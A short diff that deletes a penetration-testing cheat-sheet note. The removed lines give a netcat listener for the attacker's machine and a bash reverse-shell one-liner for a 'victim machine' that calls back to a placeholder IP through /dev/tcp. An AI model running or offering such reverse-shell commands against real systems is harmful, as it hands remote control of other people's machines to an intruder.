@@ -1,5 +1,0 @@
-# spawn a stable shell once you are in a shell
-# --- on your local machine
-sudo nc -lvnp 9001
-# --- on victim machine
-bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"
